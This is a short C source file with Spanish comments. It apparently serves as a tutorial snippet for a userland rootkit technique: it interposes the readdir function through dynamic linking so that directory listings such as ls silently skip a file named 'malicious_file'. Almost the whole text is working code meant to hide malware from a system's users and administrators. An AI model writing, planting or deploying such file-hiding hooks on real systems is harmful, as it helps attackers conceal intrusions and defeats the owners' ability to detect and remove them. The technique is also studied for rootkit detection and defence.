/*#define _GNU_SOURCE*/
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>

// Puntero de función typedef para la función readdir ls original
typedef struct dirent* (*ls_t)(DIR*);
// función ls interpuesta
struct dirent* readdir(DIR* dirp) {
  // Obtener la dirección readdir original
  ls_t original_readdir = (ls_t)dlsym(RTLD_NEXT, "readdir");
  struct dirent* entry;
  do {
    // Llama a la función ls original para obtener la siguiente entrada del directorio
    entry = original_readdir(dirp);
    // Comprobamos si la entrada es el archivo que queremos ocultar
    if (entry != NULL && strcmp(entry->d_name, "malicious_file") == 0) {
      // Omite el archivo llamando nuevamente a la función ls original
      entry = original_readdir(dirp);
    }
  } while (entry != NULL && strcmp(entry->d_name, "malicious_file") == 0);
  return entry;
}
